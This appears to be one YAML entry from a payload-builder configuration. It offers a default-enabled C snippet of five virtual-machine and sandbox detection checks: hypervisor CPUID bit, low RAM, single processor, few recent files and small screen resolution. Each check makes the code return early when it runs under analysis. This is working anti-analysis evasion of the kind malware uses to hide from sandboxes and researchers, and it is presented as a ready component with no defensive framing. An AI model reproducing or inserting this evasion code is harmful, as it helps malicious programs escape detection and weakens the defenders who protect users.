  - id: AllChecks
    display: Comprehensive VM/Sandbox Detection
    default: true
    snippet: |
      // Combined sandbox detection checks
      {
          // Check 1: Hypervisor bit
          int cpuInfo[4];
          __cpuid(cpuInfo, 1);
          if (cpuInfo[2] & (1 << 31)) return 0;

          // Check 2: Low resources
          MEMORYSTATUSEX mem = {sizeof(mem)};
          if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 3ULL * 1024 * 1024 * 1024) return 0;

          // Check 3: Processor count
          SYSTEM_INFO si;
          GetSystemInfo(&si);
          if (si.dwNumberOfProcessors < 2) return 0;

          // Check 4: Recent files
          WCHAR recent[MAX_PATH];
          if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recent))) {
              WIN32_FIND_DATAW fd;
              WCHAR search[MAX_PATH];
              wsprintfW(search, L"%s\\*", recent);
              HANDLE hf = FindFirstFileW(search, &fd);
              int count = 0;
              if (hf != INVALID_HANDLE_VALUE) {
                  do { if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) count++; }
                  while (FindNextFileW(hf, &fd) && count < 10);
                  FindClose(hf);
              }
              if (count < 3) return 0;
          }

          // Check 5: Screen resolution
          if (GetSystemMetrics(SM_CXSCREEN) < 1024) return 0;
      }
